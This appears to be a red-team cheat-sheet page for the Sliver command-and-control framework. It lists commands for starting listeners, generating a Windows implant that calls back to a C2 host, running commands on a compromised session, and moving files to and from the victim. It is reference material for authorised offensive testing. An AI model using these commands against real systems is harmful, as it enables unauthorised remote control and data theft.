---
hide:
  - toc
---
# Sliver

<div class="ol-version-note">Syntax can drift between releases. Confirm with the tool's local <code>--version</code> and <code>--help</code> output.</div>

<div class="ol-section-kicker"><span>TOOL</span><strong>SLIVER</strong></div>

## Start server
```bash
sliver-server
```
**Tool:** Sliver · **Platform:** Linux · **Tags:** C2, Server · **Context:** Operator · **Noise:** Loud

## Start client
```bash
sliver-client
```
**Tool:** Sliver · **Platform:** Any · **Tags:** C2, Client · **Context:** Operator · **Noise:** Loud

## HTTP listener
```text
http --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTP, Listener · **Context:** Operator · **Noise:** Loud

## HTTPS listener
```text
https --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTPS, Listener · **Context:** Operator · **Noise:** Loud

## mTLS listener
```text
mtls --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** mTLS, Listener · **Context:** Operator · **Noise:** Loud

## Generate Windows implant
```text
generate --os windows --arch amd64 --mtls <C2_HOST>:<LPORT> --save <OUTPUT_DIR>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Implant, Windows · **Context:** Operator · **Noise:** Loud

## Sessions
```text
sessions
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator · **Noise:** Loud

## Select session
```text
use <SESSION_ID>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator · **Noise:** Loud

## Execute command
```text
execute -o whoami /all
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** Execution · **Context:** Session · **Noise:** Loud

## Upload file
```text
upload <LOCAL_FILE> <REMOTE_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session · **Noise:** Loud

## Download file
```text
download <REMOTE_FILE> <LOCAL_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session · **Noise:** Loud

**Related:** [Red Team Sliver C2](../red-team/sliver.md) · [Staging & File Transfer](../red-team/staging-file-transfer.md)
